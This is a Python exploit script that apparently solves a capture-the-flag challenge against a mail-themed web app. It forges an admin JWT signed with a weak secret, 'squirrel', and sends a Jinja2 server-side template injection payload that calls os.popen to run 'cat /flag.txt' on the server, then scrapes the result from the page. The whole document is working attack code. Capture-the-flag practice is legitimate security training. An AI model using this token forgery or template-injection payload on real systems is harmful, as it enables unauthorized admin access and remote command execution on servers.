#!/usr/bin/env python3

from __future__ import annotations

import html
import re
from urllib.parse import quote

import jwt
import requests


BASE_URL = "https://squ1rrelmail.squ1rrel.dev"
JWT_SECRET = "squirrel"
ADMIN_ROLE = "admin"
FLAG_READ_PAYLOAD = "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}"
PREVIEW_RE = re.compile(r"Incoming Acorn:</strong>\s*(.*?)\s*</div>", re.S)


def make_admin_token() -> str:
    claims = {
        "username": "moderator",
        "role": ADMIN_ROLE,
        "exp": 2176619570,
    }
    return jwt.encode(claims, JWT_SECRET, algorithm="HS256")


def fetch_preview(acorn: str) -> str:
    token = make_admin_token()
    response = requests.get(
        f"{BASE_URL}/acorn-inbox?acorn={quote(acorn)}",
        cookies={"token": token},
        timeout=20,
    )
    response.raise_for_status()

    match = PREVIEW_RE.search(response.text)
    if not match:
        raise RuntimeError("Could not find preview block in response")
    return html.unescape(match.group(1)).strip()


def main() -> int:
    flag = fetch_preview(FLAG_READ_PAYLOAD)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())